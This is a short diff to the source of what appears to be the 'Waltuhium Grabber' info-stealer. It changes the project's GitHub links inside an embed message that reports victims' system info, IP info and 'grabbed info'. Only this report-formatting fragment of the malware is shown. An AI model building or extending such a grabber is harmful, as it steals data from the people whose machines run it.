@@ -1686,10 +1686,10 @@ class WaltuhiumGrabber:
                         {
                             "title": "Waltuhium Grabber",
                             "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
-                            "url": "https://github.com/waltuhium/Waltuhium-Grabber",
+                            "url": "https://github.com/waltuhium69/Waltuhium-Grabber",
                             "color": 34303,
                             "footer": {
-                                "text": "t.me/waltuhium | https://github.com/waltuhium/Waltuhium-Grabber"
+                                "text": "t.me/waltuhium | https://github.com/waltuhium69/Waltuhium-Grabber"
                             },
                             "thumbnail": {
                                 "url": "https://cdn.discordapp.com/attachments/1138141791766458509/1147568738665779322/IMG_9161-removebg-preview.png"
